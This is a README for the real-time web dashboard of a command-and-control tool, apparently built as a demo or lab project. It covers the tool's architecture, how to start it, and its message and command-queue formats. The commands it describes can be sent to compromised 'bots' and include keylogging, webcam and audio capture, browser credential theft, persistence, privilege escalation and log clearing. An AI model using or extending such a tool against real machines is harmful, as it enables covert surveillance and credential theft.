# WebSocket Dashboard Features

## Real-Time Updates & Command Queueing

### What's New

1. **WebSocket Real-Time Updates**
   - No more polling! Dashboard updates instantly when:
     - New bots connect/disconnect
     - Commands are executed
     - Screenshots are captured
     - Keylogs are received
     - Attack phases change
   - Connection status indicator shows WebSocket health
   - Automatic reconnection if connection drops

2. **Command Queueing from Web Interface**
   - Select multiple bots and send commands to all at once
   - Commands are queued via filesystem for C2 to pick up
   - C2 server checks for web commands every beacon cycle
   - Command results appear in real-time activity log

### Architecture

```
Web Dashboard (Browser)
    ↓↑ WebSocket (port 8081)
WebSocket Server (Python)
    ↓ reads status files
    ↓ writes command files
C:\Windows\Temp\
    ├── C2_Status.json      (server status)
    ├── C2_Bots\*.json      (bot info) 
    └── C2_CommandQueue\    (web commands)
    ↑ reads command files
    ↑ writes status files
C2 Server (escapebox.exe)
```

### How to Use

1. **Start C2 Server**
   ```
   escapebox.exe
   ```

2. **Start WebSocket Dashboard**
   ```
   start_websocket_dashboard.bat
   ```
   Or manually:
   ```
   pip install websockets
   python c2_websocket_server.py
   ```

3. **Access Dashboard**
   - Open browser to: http://localhost:8080
   - Dashboard uses `c2_dashboard_websocket.html`

### New Features in Dashboard

#### Bot Selection
- **Click** bot card to select/deselect
- **Double-click** to view bot details
- Selected count shows in command panel

#### Command Center
- Send commands to all selected bots:
  - System Info
  - Screenshot  
  - Start/Dump Keylogger
  - Process List
  - Network Connections
  - Install Persistence
  - Elevate Privileges
  - Browser Credentials
  - Webcam Capture
  - Audio Recording
  - Clear All Logs

#### Real-Time Activity Log
- Shows all C2 activities as they happen
- Color-coded by category:
  - Red border: ATTACK actions
  - Green border: C2 communications
  - Yellow border: LATERAL movement

#### Bot Detail Modal
- **System Info Tab**: Full bot details
- **Screenshots Tab**: View all captured screenshots
- **Keylogs Tab**: Read captured keystrokes
- **Commands Tab**: Command history (coming soon)

### WebSocket Messages

The WebSocket server sends these message types:

```javascript
// Status update
{
    "type": "status_update",
    "data": {
        "total_bots": 5,
        "active_bots": 4,
        "total_commands": 142
    }
}

// New screenshot notification
{
    "type": "new_screenshot",
    "data": {
        "client_id": "192.168.1.10",
        "filename": "screenshot_12345.b64",
        "timestamp": 1234567890
    }
}

// Activity log update
{
    "type": "activity_log",
    "data": {
        "activities": [
            {
                "timestamp": "12:34:56",
                "category": "ATTACK",
                "action": "SCREENSHOT",
                "message": "Screenshot captured from client"
            }
        ]
    }
}
```

### Command Queue Format

Commands from web dashboard are saved as JSON files:

```json
{
    "client_id": "192.168.1.10:50123",
    "command": "SCREENSHOT",
    "parameters": {},
    "timestamp": 1234567890,
    "source": "web_dashboard"
}
```

Files are named: `cmd_<timestamp>_<client_ip>.json`

### Security Notes

- WebSocket runs on localhost only by default
- No authentication implemented (for demo purposes)
- Commands are queued via filesystem (no direct socket to C2)
- All data stays on the local machine

### Troubleshooting

**WebSocket won't connect:**
- Check if port 8081 is available
- Ensure Python has `websockets` package installed
- Check Windows Firewall isn't blocking

**Commands not executing:**
- Verify C2 server is running
- Check `C:\Windows\Temp\C2_CommandQueue\` permissions
- Ensure bot is actively beaconing

**No real-time updates:**
- Check WebSocket connection indicator (top right)
- Open browser console for errors
- Try refreshing the page

### Future Enhancements

- WebSocket authentication
- Command history persistence
- Live terminal/shell interface
- File browser for exfiltrated data
- Attack timeline visualization
- Multi-server support
- Export capabilities for reports
